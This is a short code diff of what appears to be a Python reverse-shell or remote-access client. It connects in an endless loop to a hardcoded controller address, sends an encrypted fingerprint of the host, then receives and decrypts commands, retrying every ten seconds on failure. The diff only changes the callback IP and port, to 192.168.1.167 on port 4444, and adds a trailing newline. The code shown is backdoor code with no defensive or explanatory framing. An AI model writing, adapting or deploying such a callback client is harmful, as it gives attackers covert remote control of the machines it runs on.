@@ -14,7 +14,7 @@ def connect():
     while True:
         try:
             s = socket.socket()
-            s.connect(("192.168.0.114", 4000))
+            s.connect(("192.168.1.167", 4444))
             s.send(encrypt(fingerprint()))
             while True:
                 cmd = decrypt(s.recv(1024))
@@ -24,3 +24,4 @@ def connect():
         except: time.sleep(10)
 
 connect()
+
